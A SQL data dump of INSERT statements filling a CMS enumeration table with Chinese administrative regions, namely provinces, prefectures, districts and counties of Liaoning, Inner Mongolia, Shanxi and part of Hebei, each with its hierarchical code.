INSERT INTO dede_sys_enum VALUES ('17293', '千山区', '3503.4', 'nativeplace', '3503', '2');
INSERT INTO dede_sys_enum VALUES ('17292', '立山区', '3503.3', 'nativeplace', '3503', '2');
INSERT INTO dede_sys_enum VALUES ('17291', '铁西区', '3503.2', 'nativeplace', '3503', '2');
INSERT INTO dede_sys_enum VALUES ('17290', '铁东区', '3503.1', 'nativeplace', '3503', '2');
INSERT INTO dede_sys_enum VALUES ('17289', '鞍山市', '3503', 'nativeplace', '3503', '1');
INSERT INTO dede_sys_enum VALUES ('17288', '庄河市', '3502.10', 'nativeplace', '3502', '2');
INSERT INTO dede_sys_enum VALUES ('17287', '普兰店市', '3502.9', 'nativeplace', '3503', '2');
INSERT INTO dede_sys_enum VALUES ('17286', '瓦房店市', '3502.8', 'nativeplace', '3503', '2');
INSERT INTO dede_sys_enum VALUES ('17285', '长海县', '3502.7', 'nativeplace', '3503', '2');
INSERT INTO dede_sys_enum VALUES ('17284', '金州区', '3502.6', 'nativeplace', '3503', '2');
INSERT INTO dede_sys_enum VALUES ('17283', '旅顺口区', '3502.5', 'nativeplace', '3503', '2');
INSERT INTO dede_sys_enum VALUES ('17282', '甘井子区', '3502.4', 'nativeplace', '3502', '2');
INSERT INTO dede_sys_enum VALUES ('17281', '沙河口区', '3502.3', 'nativeplace', '3502', '2');
INSERT INTO dede_sys_enum VALUES ('17280', '西岗区', '3502.2', 'nativeplace', '3502', '2');
INSERT INTO dede_sys_enum VALUES ('17279', '中山区', '3502.1', 'nativeplace', '3502', '2');
INSERT INTO dede_sys_enum VALUES ('17278', '大连市', '3502', 'nativeplace', '3502', '1');
INSERT INTO dede_sys_enum VALUES ('17277', '新民市', '3501.13', 'nativeplace', '3501', '2');
INSERT INTO dede_sys_enum VALUES ('17276', '法库县', '3501.12', 'nativeplace', '3501', '2');
INSERT INTO dede_sys_enum VALUES ('17275', '康平县', '3501.11', 'nativeplace', '3501', '2');
INSERT INTO dede_sys_enum VALUES ('17274', '辽中县', '3501.10', 'nativeplace', '3501', '2');
INSERT INTO dede_sys_enum VALUES ('17273', '于洪区', '3501.9', 'nativeplace', '3502', '2');
INSERT INTO dede_sys_enum VALUES ('17272', '新城子区', '3501.8', 'nativeplace', '3502', '2');
INSERT INTO dede_sys_enum VALUES ('17271', '东陵区', '3501.7', 'nativeplace', '3502', '2');
INSERT INTO dede_sys_enum VALUES ('17270', '苏家屯区', '3501.6', 'nativeplace', '3502', '2');
INSERT INTO dede_sys_enum VALUES ('17269', '铁西区', '3501.5', 'nativeplace', '3502', '2');
INSERT INTO dede_sys_enum VALUES ('17268', '皇姑区', '3501.4', 'nativeplace', '3501', '2');
INSERT INTO dede_sys_enum VALUES ('17267', '大东区', '3501.3', 'nativeplace', '3501', '2');
INSERT INTO dede_sys_enum VALUES ('17266', '沈河区', '3501.2', 'nativeplace', '3501', '2');
INSERT INTO dede_sys_enum VALUES ('17265', '和平区', '3501.1', 'nativeplace', '3501', '2');
INSERT INTO dede_sys_enum VALUES ('17264', '沈阳市', '3501', 'nativeplace', '3501', '1');
INSERT INTO dede_sys_enum VALUES ('17263', '辽宁省', '3500', 'nativeplace', '3500', '0');
INSERT INTO dede_sys_enum VALUES ('17262', '额济纳旗', '3012.3', 'nativeplace', '3012', '2');
INSERT INTO dede_sys_enum VALUES ('17261', '阿拉善右旗', '3012.2', 'nativeplace', '3012', '2');
INSERT INTO dede_sys_enum VALUES ('17260', '阿拉善左旗', '3012.1', 'nativeplace', '3012', '2');
INSERT INTO dede_sys_enum VALUES ('17259', '阿拉善盟', '3012', 'nativeplace', '3012', '1');
INSERT INTO dede_sys_enum VALUES ('17258', '多伦县', '3011.12', 'nativeplace', '3011', '2');
INSERT INTO dede_sys_enum VALUES ('17257', '正蓝旗', '3011.11', 'nativeplace', '3011', '2');
INSERT INTO dede_sys_enum VALUES ('17256', '正镶白旗', '3011.10', 'nativeplace', '3011', '2');
INSERT INTO dede_sys_enum VALUES ('17255', '镶黄旗', '3011.9', 'nativeplace', '3012', '2');
INSERT INTO dede_sys_enum VALUES ('17254', '太仆寺旗', '3011.8', 'nativeplace', '3012', '2');
INSERT INTO dede_sys_enum VALUES ('17253', '西乌珠穆沁旗', '3011.7', 'nativeplace', '3012', '2');
INSERT INTO dede_sys_enum VALUES ('17252', '东乌珠穆沁旗', '3011.6', 'nativeplace', '3012', '2');
INSERT INTO dede_sys_enum VALUES ('17251', '苏尼特右旗', '3011.5', 'nativeplace', '3012', '2');
INSERT INTO dede_sys_enum VALUES ('17250', '苏尼特左旗', '3011.4', 'nativeplace', '3011', '2');
INSERT INTO dede_sys_enum VALUES ('17249', '阿巴嘎旗', '3011.3', 'nativeplace', '3011', '2');
INSERT INTO dede_sys_enum VALUES ('17248', '锡林浩特市', '3011.2', 'nativeplace', '3011', '2');
INSERT INTO dede_sys_enum VALUES ('17247', '二连浩特市', '3011.1', 'nativeplace', '3011', '2');
INSERT INTO dede_sys_enum VALUES ('17246', '锡林郭勒盟', '3011', 'nativeplace', '3011', '1');
INSERT INTO dede_sys_enum VALUES ('17245', '突泉县', '3010.6', 'nativeplace', '3011', '2');
INSERT INTO dede_sys_enum VALUES ('17244', '扎赉特旗', '3010.5', 'nativeplace', '3011', '2');
INSERT INTO dede_sys_enum VALUES ('17243', '科尔沁右翼中旗', '3010.4', 'nativeplace', '3010', '2');
INSERT INTO dede_sys_enum VALUES ('17242', '科尔沁右翼前旗', '3010.3', 'nativeplace', '3010', '2');
INSERT INTO dede_sys_enum VALUES ('17241', '阿尔山市', '3010.2', 'nativeplace', '3010', '2');
INSERT INTO dede_sys_enum VALUES ('17240', '乌兰浩特市', '3010.1', 'nativeplace', '3010', '2');
INSERT INTO dede_sys_enum VALUES ('17239', '兴安盟', '3010', 'nativeplace', '3010', '1');
INSERT INTO dede_sys_enum VALUES ('17238', '丰镇市', '3009.11', 'nativeplace', '3009', '2');
INSERT INTO dede_sys_enum VALUES ('17237', '四子王旗', '3009.10', 'nativeplace', '3009', '2');
INSERT INTO dede_sys_enum VALUES ('17236', '察哈尔右翼后旗', '3009.9', 'nativeplace', '3010', '2');
INSERT INTO dede_sys_enum VALUES ('17235', '察哈尔右翼中旗', '3009.8', 'nativeplace', '3010', '2');
INSERT INTO dede_sys_enum VALUES ('17234', '察哈尔右翼前旗', '3009.7', 'nativeplace', '3010', '2');
INSERT INTO dede_sys_enum VALUES ('17233', '凉城县', '3009.6', 'nativeplace', '3010', '2');
INSERT INTO dede_sys_enum VALUES ('17232', '兴和县', '3009.5', 'nativeplace', '3010', '2');
INSERT INTO dede_sys_enum VALUES ('17231', '商都县', '3009.4', 'nativeplace', '3009', '2');
INSERT INTO dede_sys_enum VALUES ('17230', '化德县', '3009.3', 'nativeplace', '3009', '2');
INSERT INTO dede_sys_enum VALUES ('17229', '卓资县', '3009.2', 'nativeplace', '3009', '2');
INSERT INTO dede_sys_enum VALUES ('17228', '集宁区', '3009.1', 'nativeplace', '3009', '2');
INSERT INTO dede_sys_enum VALUES ('17227', '乌兰察布市', '3009', 'nativeplace', '3009', '1');
INSERT INTO dede_sys_enum VALUES ('17226', '杭锦后旗', '3008.7', 'nativeplace', '3009', '2');
INSERT INTO dede_sys_enum VALUES ('17225', '乌拉特后旗', '3008.6', 'nativeplace', '3009', '2');
INSERT INTO dede_sys_enum VALUES ('17224', '乌拉特中旗', '3008.5', 'nativeplace', '3009', '2');
INSERT INTO dede_sys_enum VALUES ('17223', '乌拉特前旗', '3008.4', 'nativeplace', '3008', '2');
INSERT INTO dede_sys_enum VALUES ('17222', '磴口县', '3008.3', 'nativeplace', '3008', '2');
INSERT INTO dede_sys_enum VALUES ('17221', '五原县', '3008.2', 'nativeplace', '3008', '2');
INSERT INTO dede_sys_enum VALUES ('17220', '临河区', '3008.1', 'nativeplace', '3008', '2');
INSERT INTO dede_sys_enum VALUES ('17219', '巴彦淖尔市', '3008', 'nativeplace', '3008', '1');
INSERT INTO dede_sys_enum VALUES ('17218', '根河市', '3007.13', 'nativeplace', '3007', '2');
INSERT INTO dede_sys_enum VALUES ('17217', '额尔古纳市', '3007.12', 'nativeplace', '3007', '2');
INSERT INTO dede_sys_enum VALUES ('17216', '扎兰屯市', '3007.11', 'nativeplace', '3007', '2');
INSERT INTO dede_sys_enum VALUES ('17215', '牙克石市', '3007.10', 'nativeplace', '3007', '2');
INSERT INTO dede_sys_enum VALUES ('17214', '满洲里市', '3007.9', 'nativeplace', '3008', '2');
INSERT INTO dede_sys_enum VALUES ('17213', '新巴尔虎右旗', '3007.8', 'nativeplace', '3008', '2');
INSERT INTO dede_sys_enum VALUES ('17212', '新巴尔虎左旗', '3007.7', 'nativeplace', '3008', '2');
INSERT INTO dede_sys_enum VALUES ('17211', '陈巴尔虎旗', '3007.6', 'nativeplace', '3008', '2');
INSERT INTO dede_sys_enum VALUES ('17210', '鄂温克族自治旗', '3007.5', 'nativeplace', '3008', '2');
INSERT INTO dede_sys_enum VALUES ('17209', '鄂伦春自治旗', '3007.4', 'nativeplace', '3007', '2');
INSERT INTO dede_sys_enum VALUES ('17208', '莫力达瓦达斡尔族自治旗', '3007.3', 'nativeplace', '3007', '2');
INSERT INTO dede_sys_enum VALUES ('17207', '阿荣旗', '3007.2', 'nativeplace', '3007', '2');
INSERT INTO dede_sys_enum VALUES ('17206', '海拉尔区', '3007.1', 'nativeplace', '3007', '2');
INSERT INTO dede_sys_enum VALUES ('17205', '呼伦贝尔市', '3007', 'nativeplace', '3007', '1');
INSERT INTO dede_sys_enum VALUES ('17204', '伊金霍洛旗', '3006.8', 'nativeplace', '3007', '2');
INSERT INTO dede_sys_enum VALUES ('17203', '乌审旗', '3006.7', 'nativeplace', '3007', '2');
INSERT INTO dede_sys_enum VALUES ('17202', '杭锦旗', '3006.6', 'nativeplace', '3007', '2');
INSERT INTO dede_sys_enum VALUES ('17201', '鄂托克旗', '3006.5', 'nativeplace', '3007', '2');
INSERT INTO dede_sys_enum VALUES ('17200', '鄂托克前旗', '3006.4', 'nativeplace', '3006', '2');
INSERT INTO dede_sys_enum VALUES ('17199', '准格尔旗', '3006.3', 'nativeplace', '3006', '2');
INSERT INTO dede_sys_enum VALUES ('17198', '达拉特旗', '3006.2', 'nativeplace', '3006', '2');
INSERT INTO dede_sys_enum VALUES ('17197', '东胜区', '3006.1', 'nativeplace', '3006', '2');
INSERT INTO dede_sys_enum VALUES ('17196', '鄂尔多斯市', '3006', 'nativeplace', '3006', '1');
INSERT INTO dede_sys_enum VALUES ('17195', '霍林郭勒市', '3005.8', 'nativeplace', '3006', '2');
INSERT INTO dede_sys_enum VALUES ('17194', '扎鲁特旗', '3005.7', 'nativeplace', '3006', '2');
INSERT INTO dede_sys_enum VALUES ('17193', '奈曼旗', '3005.6', 'nativeplace', '3006', '2');
INSERT INTO dede_sys_enum VALUES ('17192', '库伦旗', '3005.5', 'nativeplace', '3006', '2');
INSERT INTO dede_sys_enum VALUES ('17191', '开鲁县', '3005.4', 'nativeplace', '3005', '2');
INSERT INTO dede_sys_enum VALUES ('17190', '科尔沁左翼后旗', '3005.3', 'nativeplace', '3005', '2');
INSERT INTO dede_sys_enum VALUES ('17189', '科尔沁左翼中旗', '3005.2', 'nativeplace', '3005', '2');
INSERT INTO dede_sys_enum VALUES ('17188', '科尔沁区', '3005.1', 'nativeplace', '3005', '2');
INSERT INTO dede_sys_enum VALUES ('17187', '通辽市', '3005', 'nativeplace', '3005', '1');
INSERT INTO dede_sys_enum VALUES ('17186', '敖汉旗', '3004.12', 'nativeplace', '3004', '2');
INSERT INTO dede_sys_enum VALUES ('17185', '宁城县', '3004.11', 'nativeplace', '3004', '2');
INSERT INTO dede_sys_enum VALUES ('17184', '喀喇沁旗', '3004.10', 'nativeplace', '3004', '2');
INSERT INTO dede_sys_enum VALUES ('17183', '翁牛特旗', '3004.9', 'nativeplace', '3005', '2');
INSERT INTO dede_sys_enum VALUES ('17182', '克什克腾旗', '3004.8', 'nativeplace', '3005', '2');
INSERT INTO dede_sys_enum VALUES ('17181', '林西县', '3004.7', 'nativeplace', '3005', '2');
INSERT INTO dede_sys_enum VALUES ('17180', '巴林右旗', '3004.6', 'nativeplace', '3005', '2');
INSERT INTO dede_sys_enum VALUES ('17179', '巴林左旗', '3004.5', 'nativeplace', '3005', '2');
INSERT INTO dede_sys_enum VALUES ('17178', '阿鲁科尔沁旗', '3004.4', 'nativeplace', '3004', '2');
INSERT INTO dede_sys_enum VALUES ('17177', '松山区', '3004.3', 'nativeplace', '3004', '2');
INSERT INTO dede_sys_enum VALUES ('17176', '元宝山区', '3004.2', 'nativeplace', '3004', '2');
INSERT INTO dede_sys_enum VALUES ('17175', '红山区', '3004.1', 'nativeplace', '3004', '2');
INSERT INTO dede_sys_enum VALUES ('17174', '赤峰市', '3004', 'nativeplace', '3004', '1');
INSERT INTO dede_sys_enum VALUES ('17173', '乌达区', '3003.3', 'nativeplace', '3003', '2');
INSERT INTO dede_sys_enum VALUES ('17172', '海南区', '3003.2', 'nativeplace', '3003', '2');
INSERT INTO dede_sys_enum VALUES ('17171', '海勃湾区', '3003.1', 'nativeplace', '3003', '2');
INSERT INTO dede_sys_enum VALUES ('17170', '乌海市', '3003', 'nativeplace', '3003', '1');
INSERT INTO dede_sys_enum VALUES ('17169', '达尔罕茂明安联合旗', '3002.9', 'nativeplace', '3003', '2');
INSERT INTO dede_sys_enum VALUES ('17168', '固阳县', '3002.8', 'nativeplace', '3003', '2');
INSERT INTO dede_sys_enum VALUES ('17167', '土默特右旗', '3002.7', 'nativeplace', '3003', '2');
INSERT INTO dede_sys_enum VALUES ('17166', '九原区', '3002.6', 'nativeplace', '3003', '2');
INSERT INTO dede_sys_enum VALUES ('17165', '白云矿区', '3002.5', 'nativeplace', '3003', '2');
INSERT INTO dede_sys_enum VALUES ('17164', '石拐区', '3002.4', 'nativeplace', '3002', '2');
INSERT INTO dede_sys_enum VALUES ('17163', '青山区', '3002.3', 'nativeplace', '3002', '2');
INSERT INTO dede_sys_enum VALUES ('17162', '昆都仑区', '3002.2', 'nativeplace', '3002', '2');
INSERT INTO dede_sys_enum VALUES ('17161', '东河区', '3002.1', 'nativeplace', '3002', '2');
INSERT INTO dede_sys_enum VALUES ('17160', '包头市', '3002', 'nativeplace', '3002', '1');
INSERT INTO dede_sys_enum VALUES ('17159', '武川县', '3001.9', 'nativeplace', '3002', '2');
INSERT INTO dede_sys_enum VALUES ('17158', '清水河县', '3001.8', 'nativeplace', '3002', '2');
INSERT INTO dede_sys_enum VALUES ('17157', '和林格尔县', '3001.7', 'nativeplace', '3002', '2');
INSERT INTO dede_sys_enum VALUES ('17156', '托克托县', '3001.6', 'nativeplace', '3002', '2');
INSERT INTO dede_sys_enum VALUES ('17155', '土默特左旗', '3001.5', 'nativeplace', '3002', '2');
INSERT INTO dede_sys_enum VALUES ('17154', '赛罕区', '3001.4', 'nativeplace', '3001', '2');
INSERT INTO dede_sys_enum VALUES ('17153', '玉泉区', '3001.3', 'nativeplace', '3001', '2');
INSERT INTO dede_sys_enum VALUES ('17152', '回民区', '3001.2', 'nativeplace', '3001', '2');
INSERT INTO dede_sys_enum VALUES ('17151', '新城区', '3001.1', 'nativeplace', '3001', '2');
INSERT INTO dede_sys_enum VALUES ('17150', '呼和浩特市', '3001', 'nativeplace', '3001', '1');
INSERT INTO dede_sys_enum VALUES ('17149', '内蒙古自治区', '3000', 'nativeplace', '3000', '0');
INSERT INTO dede_sys_enum VALUES ('17148', '汾阳市', '2511.13', 'nativeplace', '2511', '2');
INSERT INTO dede_sys_enum VALUES ('17147', '孝义市', '2511.12', 'nativeplace', '2511', '2');
INSERT INTO dede_sys_enum VALUES ('17146', '交口县', '2511.11', 'nativeplace', '2511', '2');
INSERT INTO dede_sys_enum VALUES ('17145', '中阳县', '2511.10', 'nativeplace', '2511', '2');
INSERT INTO dede_sys_enum VALUES ('17144', '方山县', '2511.9', 'nativeplace', '2512', '2');
INSERT INTO dede_sys_enum VALUES ('17143', '岚　县', '2511.8', 'nativeplace', '2512', '2');
INSERT INTO dede_sys_enum VALUES ('17142', '石楼县', '2511.7', 'nativeplace', '2512', '2');
INSERT INTO dede_sys_enum VALUES ('17141', '柳林县', '2511.6', 'nativeplace', '2512', '2');
INSERT INTO dede_sys_enum VALUES ('17140', '临　县', '2511.5', 'nativeplace', '2512', '2');
INSERT INTO dede_sys_enum VALUES ('17139', '兴　县', '2511.4', 'nativeplace', '2511', '2');
INSERT INTO dede_sys_enum VALUES ('17138', '交城县', '2511.3', 'nativeplace', '2511', '2');
INSERT INTO dede_sys_enum VALUES ('17137', '文水县', '2511.2', 'nativeplace', '2511', '2');
INSERT INTO dede_sys_enum VALUES ('17136', '离石区', '2511.1', 'nativeplace', '2511', '2');
INSERT INTO dede_sys_enum VALUES ('17135', '吕梁市', '2511', 'nativeplace', '2511', '1');
INSERT INTO dede_sys_enum VALUES ('17134', '霍州市', '2510.17', 'nativeplace', '2510', '2');
INSERT INTO dede_sys_enum VALUES ('17133', '侯马市', '2510.16', 'nativeplace', '2510', '2');
INSERT INTO dede_sys_enum VALUES ('17132', '汾西县', '2510.15', 'nativeplace', '2510', '2');
INSERT INTO dede_sys_enum VALUES ('17131', '蒲　县', '2510.14', 'nativeplace', '2510', '2');
INSERT INTO dede_sys_enum VALUES ('17130', '永和县', '2510.13', 'nativeplace', '2510', '2');
INSERT INTO dede_sys_enum VALUES ('17129', '隰　县', '2510.12', 'nativeplace', '2510', '2');
INSERT INTO dede_sys_enum VALUES ('17128', '大宁县', '2510.11', 'nativeplace', '2510', '2');
INSERT INTO dede_sys_enum VALUES ('17127', '乡宁县', '2510.10', 'nativeplace', '2510', '2');
INSERT INTO dede_sys_enum VALUES ('17126', '吉　县', '2510.9', 'nativeplace', '2511', '2');
INSERT INTO dede_sys_enum VALUES ('17125', '浮山县', '2510.8', 'nativeplace', '2511', '2');
INSERT INTO dede_sys_enum VALUES ('17124', '安泽县', '2510.7', 'nativeplace', '2511', '2');
INSERT INTO dede_sys_enum VALUES ('17123', '古　县', '2510.6', 'nativeplace', '2511', '2');
INSERT INTO dede_sys_enum VALUES ('17122', '洪洞县', '2510.5', 'nativeplace', '2511', '2');
INSERT INTO dede_sys_enum VALUES ('17121', '襄汾县', '2510.4', 'nativeplace', '2510', '2');
INSERT INTO dede_sys_enum VALUES ('17120', '翼城县', '2510.3', 'nativeplace', '2510', '2');
INSERT INTO dede_sys_enum VALUES ('17119', '曲沃县', '2510.2', 'nativeplace', '2510', '2');
INSERT INTO dede_sys_enum VALUES ('17118', '尧都区', '2510.1', 'nativeplace', '2510', '2');
INSERT INTO dede_sys_enum VALUES ('17117', '临汾市', '2510', 'nativeplace', '2510', '1');
INSERT INTO dede_sys_enum VALUES ('17116', '原平市', '2509.14', 'nativeplace', '2509', '2');
INSERT INTO dede_sys_enum VALUES ('17115', '偏关县', '2509.13', 'nativeplace', '2509', '2');
INSERT INTO dede_sys_enum VALUES ('17114', '保德县', '2509.12', 'nativeplace', '2509', '2');
INSERT INTO dede_sys_enum VALUES ('17113', '河曲县', '2509.11', 'nativeplace', '2509', '2');
INSERT INTO dede_sys_enum VALUES ('17112', '岢岚县', '2509.10', 'nativeplace', '2509', '2');
INSERT INTO dede_sys_enum VALUES ('17111', '五寨县', '2509.9', 'nativeplace', '2510', '2');
INSERT INTO dede_sys_enum VALUES ('17110', '神池县', '2509.8', 'nativeplace', '2510', '2');
INSERT INTO dede_sys_enum VALUES ('17109', '静乐县', '2509.7', 'nativeplace', '2510', '2');
INSERT INTO dede_sys_enum VALUES ('17108', '宁武县', '2509.6', 'nativeplace', '2510', '2');
INSERT INTO dede_sys_enum VALUES ('17107', '繁峙县', '2509.5', 'nativeplace', '2510', '2');
INSERT INTO dede_sys_enum VALUES ('17106', '代　县', '2509.4', 'nativeplace', '2509', '2');
INSERT INTO dede_sys_enum VALUES ('17105', '五台县', '2509.3', 'nativeplace', '2509', '2');
INSERT INTO dede_sys_enum VALUES ('17104', '定襄县', '2509.2', 'nativeplace', '2509', '2');
INSERT INTO dede_sys_enum VALUES ('17103', '忻府区', '2509.1', 'nativeplace', '2509', '2');
INSERT INTO dede_sys_enum VALUES ('17102', '忻州市', '2509', 'nativeplace', '2509', '1');
INSERT INTO dede_sys_enum VALUES ('17101', '河津市', '2508.13', 'nativeplace', '2508', '2');
INSERT INTO dede_sys_enum VALUES ('17100', '永济市', '2508.12', 'nativeplace', '2508', '2');
INSERT INTO dede_sys_enum VALUES ('17099', '芮城县', '2508.11', 'nativeplace', '2508', '2');
INSERT INTO dede_sys_enum VALUES ('17098', '平陆县', '2508.10', 'nativeplace', '2508', '2');
INSERT INTO dede_sys_enum VALUES ('17097', '夏　县', '2508.9', 'nativeplace', '2509', '2');
INSERT INTO dede_sys_enum VALUES ('17096', '垣曲县', '2508.8', 'nativeplace', '2509', '2');
INSERT INTO dede_sys_enum VALUES ('17095', '绛　县', '2508.7', 'nativeplace', '2509', '2');
INSERT INTO dede_sys_enum VALUES ('17094', '新绛县', '2508.6', 'nativeplace', '2509', '2');
INSERT INTO dede_sys_enum VALUES ('17093', '稷山县', '2508.5', 'nativeplace', '2509', '2');
INSERT INTO dede_sys_enum VALUES ('17092', '闻喜县', '2508.4', 'nativeplace', '2508', '2');
INSERT INTO dede_sys_enum VALUES ('17091', '万荣县', '2508.3', 'nativeplace', '2508', '2');
INSERT INTO dede_sys_enum VALUES ('17090', '临猗县', '2508.2', 'nativeplace', '2508', '2');
INSERT INTO dede_sys_enum VALUES ('17089', '盐湖区', '2508.1', 'nativeplace', '2508', '2');
INSERT INTO dede_sys_enum VALUES ('17088', '运城市', '2508', 'nativeplace', '2508', '1');
INSERT INTO dede_sys_enum VALUES ('17087', '介休市', '2507.11', 'nativeplace', '2507', '2');
INSERT INTO dede_sys_enum VALUES ('17086', '灵石县', '2507.10', 'nativeplace', '2507', '2');
INSERT INTO dede_sys_enum VALUES ('17085', '平遥县', '2507.9', 'nativeplace', '2508', '2');
INSERT INTO dede_sys_enum VALUES ('17084', '祁　县', '2507.8', 'nativeplace', '2508', '2');
INSERT INTO dede_sys_enum VALUES ('17083', '太谷县', '2507.7', 'nativeplace', '2508', '2');
INSERT INTO dede_sys_enum VALUES ('17082', '寿阳县', '2507.6', 'nativeplace', '2508', '2');
INSERT INTO dede_sys_enum VALUES ('17081', '昔阳县', '2507.5', 'nativeplace', '2508', '2');
INSERT INTO dede_sys_enum VALUES ('17080', '和顺县', '2507.4', 'nativeplace', '2507', '2');
INSERT INTO dede_sys_enum VALUES ('17079', '左权县', '2507.3', 'nativeplace', '2507', '2');
INSERT INTO dede_sys_enum VALUES ('17078', '榆社县', '2507.2', 'nativeplace', '2507', '2');
INSERT INTO dede_sys_enum VALUES ('17077', '榆次区', '2507.1', 'nativeplace', '2507', '2');
INSERT INTO dede_sys_enum VALUES ('17076', '晋中市', '2507', 'nativeplace', '2507', '1');
INSERT INTO dede_sys_enum VALUES ('17075', '怀仁县', '2506.6', 'nativeplace', '2507', '2');
INSERT INTO dede_sys_enum VALUES ('17074', '右玉县', '2506.5', 'nativeplace', '2507', '2');
INSERT INTO dede_sys_enum VALUES ('17073', '应　县', '2506.4', 'nativeplace', '2506', '2');
INSERT INTO dede_sys_enum VALUES ('17072', '山阴县', '2506.3', 'nativeplace', '2506', '2');
INSERT INTO dede_sys_enum VALUES ('17071', '平鲁区', '2506.2', 'nativeplace', '2506', '2');
INSERT INTO dede_sys_enum VALUES ('17070', '朔城区', '2506.1', 'nativeplace', '2506', '2');
INSERT INTO dede_sys_enum VALUES ('17069', '朔州市', '2506', 'nativeplace', '2506', '1');
INSERT INTO dede_sys_enum VALUES ('17068', '高平市', '2505.6', 'nativeplace', '2506', '2');
INSERT INTO dede_sys_enum VALUES ('17067', '泽州县', '2505.5', 'nativeplace', '2506', '2');
INSERT INTO dede_sys_enum VALUES ('17066', '陵川县', '2505.4', 'nativeplace', '2505', '2');
INSERT INTO dede_sys_enum VALUES ('17065', '阳城县', '2505.3', 'nativeplace', '2505', '2');
INSERT INTO dede_sys_enum VALUES ('17064', '沁水县', '2505.2', 'nativeplace', '2505', '2');
INSERT INTO dede_sys_enum VALUES ('17063', '城　区', '2505.1', 'nativeplace', '2505', '2');
INSERT INTO dede_sys_enum VALUES ('17062', '晋城市', '2505', 'nativeplace', '2505', '1');
INSERT INTO dede_sys_enum VALUES ('17061', '潞城市', '2504.13', 'nativeplace', '2504', '2');
INSERT INTO dede_sys_enum VALUES ('17060', '沁源县', '2504.12', 'nativeplace', '2504', '2');
INSERT INTO dede_sys_enum VALUES ('17059', '沁　县', '2504.11', 'nativeplace', '2504', '2');
INSERT INTO dede_sys_enum VALUES ('17058', '武乡县', '2504.10', 'nativeplace', '2504', '2');
INSERT INTO dede_sys_enum VALUES ('17057', '长子县', '2504.9', 'nativeplace', '2505', '2');
INSERT INTO dede_sys_enum VALUES ('17056', '壶关县', '2504.8', 'nativeplace', '2505', '2');
INSERT INTO dede_sys_enum VALUES ('17055', '黎城县', '2504.7', 'nativeplace', '2505', '2');
INSERT INTO dede_sys_enum VALUES ('17054', '平顺县', '2504.6', 'nativeplace', '2505', '2');
INSERT INTO dede_sys_enum VALUES ('17053', '屯留县', '2504.5', 'nativeplace', '2505', '2');
INSERT INTO dede_sys_enum VALUES ('17052', '襄垣县', '2504.4', 'nativeplace', '2504', '2');
INSERT INTO dede_sys_enum VALUES ('17051', '长治县', '2504.3', 'nativeplace', '2504', '2');
INSERT INTO dede_sys_enum VALUES ('17050', '郊　区', '2504.2', 'nativeplace', '2504', '2');
INSERT INTO dede_sys_enum VALUES ('17049', '城　区', '2504.1', 'nativeplace', '2504', '2');
INSERT INTO dede_sys_enum VALUES ('17048', '长治市', '2504', 'nativeplace', '2504', '1');
INSERT INTO dede_sys_enum VALUES ('17047', '盂　县', '2503.5', 'nativeplace', '2504', '2');
INSERT INTO dede_sys_enum VALUES ('17046', '平定县', '2503.4', 'nativeplace', '2503', '2');
INSERT INTO dede_sys_enum VALUES ('17045', '郊　区', '2503.3', 'nativeplace', '2503', '2');
INSERT INTO dede_sys_enum VALUES ('17044', '矿　区', '2503.2', 'nativeplace', '2503', '2');
INSERT INTO dede_sys_enum VALUES ('17043', '城　区', '2503.1', 'nativeplace', '2503', '2');
INSERT INTO dede_sys_enum VALUES ('17042', '阳泉市', '2503', 'nativeplace', '2503', '1');
INSERT INTO dede_sys_enum VALUES ('17041', '南郊区', '2502.12', 'nativeplace', '2502', '2');
INSERT INTO dede_sys_enum VALUES ('17040', '矿　区', '2502.11', 'nativeplace', '2502', '2');
INSERT INTO dede_sys_enum VALUES ('17039', '城　区', '2502.10', 'nativeplace', '2502', '2');
INSERT INTO dede_sys_enum VALUES ('17038', '大同县', '2502.9', 'nativeplace', '2503', '2');
INSERT INTO dede_sys_enum VALUES ('17037', '左云县', '2502.8', 'nativeplace', '2503', '2');
INSERT INTO dede_sys_enum VALUES ('17036', '浑源县', '2502.7', 'nativeplace', '2503', '2');
INSERT INTO dede_sys_enum VALUES ('17035', '灵丘县', '2502.6', 'nativeplace', '2503', '2');
INSERT INTO dede_sys_enum VALUES ('17034', '广灵县', '2502.5', 'nativeplace', '2503', '2');
INSERT INTO dede_sys_enum VALUES ('17033', '天镇县', '2502.4', 'nativeplace', '2502', '2');
INSERT INTO dede_sys_enum VALUES ('17032', '阳高县', '2502.3', 'nativeplace', '2502', '2');
INSERT INTO dede_sys_enum VALUES ('17031', '新荣区', '2502.2', 'nativeplace', '2502', '2');
INSERT INTO dede_sys_enum VALUES ('17030', '南郊区', '2502.1', 'nativeplace', '2502', '2');
INSERT INTO dede_sys_enum VALUES ('17029', '大同市', '2502', 'nativeplace', '2502', '1');
INSERT INTO dede_sys_enum VALUES ('17028', '古交市', '2501.10', 'nativeplace', '2501', '2');
INSERT INTO dede_sys_enum VALUES ('17027', '娄烦县', '2501.9', 'nativeplace', '2502', '2');
INSERT INTO dede_sys_enum VALUES ('17026', '阳曲县', '2501.8', 'nativeplace', '2502', '2');
INSERT INTO dede_sys_enum VALUES ('17025', '清徐县', '2501.7', 'nativeplace', '2502', '2');
INSERT INTO dede_sys_enum VALUES ('17024', '晋源区', '2501.6', 'nativeplace', '2502', '2');
INSERT INTO dede_sys_enum VALUES ('17023', '万柏林区', '2501.5', 'nativeplace', '2502', '2');
INSERT INTO dede_sys_enum VALUES ('17022', '尖草坪区', '2501.4', 'nativeplace', '2501', '2');
INSERT INTO dede_sys_enum VALUES ('17021', '杏花岭区', '2501.3', 'nativeplace', '2501', '2');
INSERT INTO dede_sys_enum VALUES ('17020', '迎泽区', '2501.2', 'nativeplace', '2501', '2');
INSERT INTO dede_sys_enum VALUES ('17019', '小店区', '2501.1', 'nativeplace', '2501', '2');
INSERT INTO dede_sys_enum VALUES ('17018', '太原市', '2501', 'nativeplace', '2501', '1');
INSERT INTO dede_sys_enum VALUES ('17017', '山西省', '2500', 'nativeplace', '2500', '0');
INSERT INTO dede_sys_enum VALUES ('17016', '河间市', '2011.16', 'nativeplace', '2011', '2');
INSERT INTO dede_sys_enum VALUES ('17015', '黄骅市', '2011.15', 'nativeplace', '2011', '2');
INSERT INTO dede_sys_enum VALUES ('17014', '任丘市', '2011.14', 'nativeplace', '2011', '2');
INSERT INTO dede_sys_enum VALUES ('17013', '泊头市', '2011.13', 'nativeplace', '2011', '2');
INSERT INTO dede_sys_enum VALUES ('17012', '孟村回族自治县', '2011.12', 'nativeplace', '2011', '2');
INSERT INTO dede_sys_enum VALUES ('17011', '献　县', '2011.11', 'nativeplace', '2011', '2');
INSERT INTO dede_sys_enum VALUES ('17010', '吴桥县', '2011.10', 'nativeplace', '2011', '2');
